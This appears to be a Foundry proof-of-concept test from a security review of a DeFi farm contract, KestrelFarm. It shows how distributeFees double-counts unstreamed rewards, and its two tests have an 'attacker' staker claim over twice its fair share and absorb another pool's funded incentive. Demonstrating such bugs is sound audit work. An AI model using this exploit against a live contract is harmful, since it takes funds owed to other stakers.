// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {console} from "forge-std/Test.sol";
import {ProofBase} from "./ProofBase.sol";
import {KestrelFarm} from "kestrel/src/KestrelFarm.sol";

/// KestrelFarm.distributeFees treats every token the farm holds beyond `unclaimed` (rewards earned and
/// not yet claimed) as new fees. `_notify` keeps the unstreamed part of the current stream in the farm's
/// balance and rolls it into the new stream. Each distribution during a live stream counts that remainder
/// twice, so the farm promises more than it holds: early claimers take later claimers' rewards, and a
/// funded incentive in the same token is pulled into the fee pool.
contract FeeDistributionCountsStreamTwiceTest is ProofBase {
    bytes32 feePool;
    bytes32 incentivePool;

    function setUp() public override {
        super.setUp();
        vm.prank(lp);
        router.addLiquidity(address(weth), address(usdc), 30, 1_000e18, 3_000_000e6, 0, 0, lp, block.timestamp);
        vm.prank(team);
        router.addLiquidity(address(meme), address(weth), 30, 100_000_000e18, 100e18, 0, 0, team, block.timestamp);
        feePool = _pool(address(weth), address(usdc), 30);
        incentivePool = _pool(address(meme), address(weth), 30);

        vm.startPrank(admin);
        farm.addReward(feePool, address(weth));
        farm.setFeeTarget(address(weth), feePool);
        farm.addReward(incentivePool, address(weth));
        vm.stopPrank();

        uint256 lpShares = vault.sharesOf(feePool, lp);
        vm.prank(lp);
        farm.stake(feePool, lpShares);
        vm.prank(attacker);
        router.addLiquidity(address(weth), address(usdc), 30, 300e18, 900_000e6, 0, 0, attacker, block.timestamp);
        uint256 attackerShares = vault.sharesOf(feePool, attacker);
        vm.prank(attacker);
        farm.stake(feePool, attackerShares);
        uint256 teamShares = vault.sharesOf(incentivePool, team);
        vm.prank(team);
        farm.stake(incentivePool, teamShares);
    }

    function _tradeAndCollect() internal {
        vm.startPrank(trader);
        uint256 out = router.swapExactTokensForTokens(100e18, 0, _path(address(weth), address(usdc)), _fees(30), trader, block.timestamp);
        router.swapExactTokensForTokens(out, 0, _path(address(usdc), address(weth)), _fees(30), trader, block.timestamp);
        vm.stopPrank();
        address[] memory tokens = new address[](1);
        tokens[0] = address(weth);
        vault.collectProtocolFees(tokens);
    }

    function test_dailyDistributionsPromiseMoreThanTheFarmHolds() public {
        uint256 feesIn;
        for (uint256 day; day < 7; ++day) {
            uint256 before = weth.balanceOf(address(farm));
            _tradeAndCollect();
            feesIn += weth.balanceOf(address(farm)) - before;
            farm.distributeFees(address(weth)); // the keeper, once a day
            skip(1 days);
        }
        skip(7 days);

        uint256 promised = farm.earned(feePool, address(weth), lp) + farm.earned(feePool, address(weth), attacker);
        console.log("protocol fees received (wei)", feesIn);
        console.log("rewards promised to stakers (wei)", promised);
        console.log("farm WETH balance (wei)", weth.balanceOf(address(farm)));
        assertGt(promised, feesIn * 2);
        assertGt(promised, weth.balanceOf(address(farm)));

        // The smaller staker claims first and is paid about twice their fair part of the fees; the
        // other staker cannot claim.
        uint256 attackerShare = farm.staked(feePool, attacker);
        uint256 fairPart = feesIn * attackerShare / farm.totalStaked(feePool);
        uint256 balanceBefore = weth.balanceOf(attacker);
        vm.prank(attacker);
        farm.claim(feePool);
        uint256 paid = weth.balanceOf(attacker) - balanceBefore;
        console.log("first claimer's fair part (wei)", fairPart);
        console.log("first claimer paid (wei)", paid);
        assertGt(paid, fairPart * 2);
        vm.prank(lp);
        vm.expectRevert();
        farm.claim(feePool);
    }

    function test_distributionPullsAFundedIncentiveIntoTheFeePool() public {
        // A token team funds a 70 WETH incentive for its own pool.
        vm.prank(team);
        farm.fund(incentivePool, address(weth), 70e18);
        skip(1 days);

        // One small fee collection later, anyone distributes: the incentive's unstreamed 60 WETH is
        // counted as new protocol fees for the fee pool.
        _tradeAndCollect();
        uint256 fees = weth.balanceOf(address(farm)) - 70e18;
        vm.prank(attacker);
        farm.distributeFees(address(weth));
        skip(7 days);

        uint256 feePoolPromised = farm.earned(feePool, address(weth), lp) + farm.earned(feePool, address(weth), attacker);
        uint256 incentivePromised = farm.earned(incentivePool, address(weth), team);
        console.log("fees received (wei)", fees);
        console.log("promised to fee pool stakers (wei)", feePoolPromised);
        console.log("promised to incentive stakers (wei)", incentivePromised);
        assertGt(feePoolPromised, fees + 59e18);
        assertApproxEqAbs(incentivePromised, 70e18, 1e8);

        // Fee pool stakers claim first and take the incentive's tokens; the team's stakers are left short.
        vm.prank(attacker);
        farm.claim(feePool);
        vm.prank(lp);
        farm.claim(feePool);
        assertLt(weth.balanceOf(address(farm)), incentivePromised);
        vm.prank(team);
        vm.expectRevert();
        farm.claim(incentivePool);
    }
}
